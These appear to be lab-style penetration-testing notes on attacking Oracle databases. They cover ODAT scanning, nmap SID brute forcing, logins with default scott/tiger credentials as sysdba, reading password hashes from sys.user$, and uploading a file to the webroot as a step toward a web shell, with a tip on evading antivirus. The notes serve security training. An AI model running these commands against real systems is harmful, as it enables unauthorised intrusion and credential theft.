## FootPrinting

### ODAT 

```sh
/odat.py all -s 10.129.204.235
```

Oracle Database Attacking Tool (`ODAT`) can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.

### Nmap

```sh
sudo nmap -p1521 -sV 10.129.204.235 --open
```

If the client does not specify a SID. Then, the default value is defined in the `tnsnames.ora` file is used.

```sh
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
### SID brute forcing
```

### SQLplus

 [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985)
```sh
sqlplus scott/tiger@10.129.204.235/XE
### To login using the valid set of credentials
```

If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

```sh
> sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf
```

### Oracle RDBMS - Database Enumeration

```sh
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

System Database Admin (`sysdba`). We can not add new users or make any modifications. We could retrieve the password hashes from the `sys.user$` .

### Orace RDBMS - File Upload

Another option is to upload a web shell to the target. If the target is running a web server but we need to know the exact directory for it. Default paths:

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

`First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important.`

```sh
> ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
### uploading the file
  
> curl -X GET http://10.129.204.235/testing.txt
### testing the upload , can be done by visiting on browser too.
```

---